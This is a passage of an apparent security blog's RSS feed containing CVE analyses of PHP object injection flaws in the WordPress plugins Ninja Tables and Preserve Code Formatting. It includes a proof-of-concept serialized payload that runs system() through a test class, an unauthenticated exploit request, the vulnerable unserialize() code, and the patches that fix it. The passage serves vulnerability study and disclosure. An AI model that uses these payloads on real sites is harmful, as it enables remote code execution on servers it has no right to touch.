1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a class for testing in &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Let the request pass through BurpSuite proxy&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with args[callback] containing a serialized payload encoded in base64&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;args[callback] = base64_encode(&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:4:&amp;#34;ls /&amp;#34;;}&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[callback]=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ== HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-21-cve-2025-2939/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-21-cve-2025-2939/result.png&#39; alt=&#34;Result&#34; height=&#34;828&#34; width=&#34;1471&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Versions &amp;lt;= 5.0.18 of the Ninja Tables plugin handle the &lt;code&gt;args[callback]&lt;/code&gt; parameter insecurely, executing &lt;code&gt;unserialize()&lt;/code&gt; on user input without any validation. This allows an unauthenticated attacker to supply a serialized object payload and achieve code execution on the server. The 5.0.19 update completely removes the use of &lt;code&gt;unserialize()&lt;/code&gt; and replaces it with &lt;code&gt;json_decode&lt;/code&gt;, fully resolving the issue.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; must not be used on client-supplied input without validation.&lt;/li&gt;&#xA;&lt;li&gt;The Ajax hook &lt;code&gt;admin_post_nopriv_*&lt;/code&gt; exposes an attack surface to unauthenticated users.&lt;/li&gt;&#xA;&lt;li&gt;A single crafted HTTP request is enough to trigger exploitation.&lt;/li&gt;&#xA;&lt;li&gt;Version 5.0.19 correctly mitigates the issue by switching to a safer format such as JSON.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-php-object-injection-to-limited-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables – Easy Data Table Builder Plugin &amp;lt;= 5.0.18 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53572 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-20-cve-2025-49386/</link>
      <pubDate>Thu, 20 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-20-cve-2025-49386/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; vulnerability in Scott Reilly’s &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt; plugin (&lt;em&gt;preserve-code-formatting&lt;/em&gt;) allows &lt;strong&gt;Object Injection&lt;/strong&gt;. This issue affects &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt; versions from &lt;code&gt;n/a&lt;/code&gt; up to &lt;code&gt;&amp;lt;= 4.0.1&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53572&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53572&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: High (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/preserve-code-formatting/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Preserve Code Formatting Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v4.0.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this code, the &lt;code&gt;unserialize()&lt;/code&gt; function is executed directly on user-supplied input (&lt;code&gt;$match[2]&lt;/code&gt; after Base64 decoding). This introduces a critical vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection risk&lt;/strong&gt;: If an attacker injects a malicious serialized PHP object encoded in Base64, decoding and unserializing will instantiate the malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potentially &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No validation&lt;/strong&gt;: There are no checks in place to validate the data before calling &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If the data is malformed or fails to decode, the application does not handle errors safely, increasing exploitability.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v5.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/diff.png&#39; alt=&#34;Diff&#34; height=&#34;798&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; was replaced with &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$decoded_data = str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $matches[2] ) ) );&#xA;if ( ! $this-&amp;gt;is_content_safe( $decoded_data ) ) {&#xA;    return $matches[0];&#xA;}&#xA;$data = json_decode( $decoded_data, true );&#xA;if ( $data === null &amp;amp;&amp;amp; json_last_error() !== JSON_ERROR_NONE ) {&#xA;    $data = $decoded_data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Removing &lt;code&gt;unserialize()&lt;/code&gt; completely eliminates the possibility of &lt;strong&gt;PHP Object Injection&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following filter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter( &amp;#39;content_save_pre&amp;#39;, array( $this, &amp;#39;preserve_postprocess&amp;#39; ), 100 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;content_save_pre&lt;/code&gt; hook is executed before a post’s content is written to the database. This makes it an ideal point to modify or filter content.&lt;/p&gt;&#xA;&lt;p&gt;When triggered, the callback &lt;code&gt;preserve_postprocess&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function preserve_postprocess( $content, $preserve = false ) {&#xA;    $options                    = $this-&amp;gt;get_options();&#xA;    $preserve_tags              = (array) $options[&amp;#39;preserve_tags&amp;#39;];&#xA;    $wrap_multiline_code_in_pre = (bool)  $options[&amp;#39;wrap_multiline_code_in_pre&amp;#39;];&#xA;    $result                     = &amp;#39;&amp;#39;;&#xA;&#xA;    foreach ( $preserve_tags as $tag ) {&#xA;        if ( $result ) {&#xA;            $content = $result;&#xA;            $result = &amp;#39;&amp;#39;;&#xA;        }&#xA;&#xA;        $codes = preg_split( &amp;#34;/(\\{\\!\\{{$tag}[^\\]]*\\}\\!\\}.*\\{\\!\\{\\/{$tag}\\}\\!\\})/Us&amp;#34;, $content, -1, PREG_SPLIT_DELIM_CAPTURE );&#xA;&#xA;        foreach ( $codes as $code ) {&#xA;            if ( preg_match( &amp;#34;/\\{\\!\\{({$tag}[^\\]]*)\\}\\!\\}(.*)\\{\\!\\{\\/{$tag}\\}\\!\\}/Us&amp;#34;, $code, $match ) ) {&#xA;                // Note: base64_decode is only being used to decode user-supplied content of code tags which&#xA;                // had been encoded earlier in the filtering process to prevent modification by WP.&#xA;                $data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&#xA;                if ( $preserve ) {&#xA;                    $data = $this-&amp;gt;preserve_code_formatting( $data );&#xA;                }&#xA;                $code = &amp;#34;&amp;lt;{$match[1]}&amp;gt;$data&amp;lt;/$tag&amp;gt;&amp;#34;;&#xA;                if ( $preserve &amp;amp;&amp;amp; $wrap_multiline_code_in_pre &amp;amp;&amp;amp; ( &amp;#39;pre&amp;#39; != $tag ) &amp;amp;&amp;amp; preg_match( &amp;#34;/\n/&amp;#34;, $data ) ) {&#xA;                    $code = &amp;#39;&amp;lt;pre&amp;gt;&amp;#39; . $code . &amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;;&#xA;                }&#xA;            }&#xA;            $result .= $code;&#xA;        }&#xA;    }&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Set a breakpoint at the beginning of &lt;code&gt;preserve_postprocess()&lt;/code&gt; and create a new post:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp/v2/posts/129?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wp-settings-time-3=1763365761; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1763781752%7CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq%7Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de; wp-settings-2=libraryContent%3Dbrowse; wp-settings-time-2=1763608953&#xA;...&#xA;{&amp;#34;id&amp;#34;:129,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:paragraph --&amp;gt;\n&amp;lt;p&amp;gt;Payload&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;,&amp;#34;title&amp;#34;:&amp;#34;Test&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/content.png&#34; title=&#34;Value of $content&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/content.png&#34; data-sub-html=&#34;&lt;h2&gt;Content&lt;/h2&gt;&lt;p&gt;Value of $content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/content.png&#39; alt=&#34;Content&#34; height=&#34;579&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $content&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$content&lt;/code&gt; matches the value supplied in the &lt;code&gt;&amp;quot;content&amp;quot;&lt;/code&gt; field.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$codes = preg_split(&#xA;    &amp;#34;/(\{\!\{{$tag}[^\]]*\}\!\}.*\{\!\{\/{$tag}\}\!\})/Us&amp;#34;,&#xA;    $content,&#xA;    -1,&#xA;    PREG_SPLIT_DELIM_CAPTURE&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This regex locates the custom preserve tag blocks &lt;code&gt;{!{$tag}...}!}&lt;/code&gt; and their matching closing tags. &lt;code&gt;PREG_SPLIT_DELIM_CAPTURE&lt;/code&gt; ensures the matching blocks are preserved in the output array.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/tag.png&#34; title=&#34;Value of $tag&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/tag.png&#34; data-sub-html=&#34;&lt;h2&gt;Tag&lt;/h2&gt;&lt;p&gt;Value of $tag&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/tag.png&#39; alt=&#34;Tag&#34; height=&#34;509&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $tag&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;$tag&lt;/code&gt; is &lt;code&gt;code&lt;/code&gt; or &lt;code&gt;pre&lt;/code&gt;, the preserve sections will be extracted; otherwise, the original content remains unchanged.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#34;/\\{\\!\\{({$tag}[^\\]]*)\\}\\!\\}(.*)\\{\\!\\{\\/{$tag}\\}\\!\\}/Us&amp;#34;, $code, $match ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;preg_match()&lt;/code&gt; checks for a preserve block within &lt;code&gt;$code&lt;/code&gt;.&lt;br&gt;&#xA;&lt;code&gt;$match[1]&lt;/code&gt; → tag or attributes&lt;br&gt;&#xA;&lt;code&gt;$match[2]&lt;/code&gt; → block content&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/match.png&#34; title=&#34;Value of $match&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/match.png&#34; data-sub-html=&#34;&lt;h2&gt;Match&lt;/h2&gt;&lt;p&gt;Value of $match&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/match.png&#39; alt=&#34;Match&#34; height=&#34;615&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $match&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Finally, &lt;code&gt;$match[2]&lt;/code&gt; is Base64 decoded, 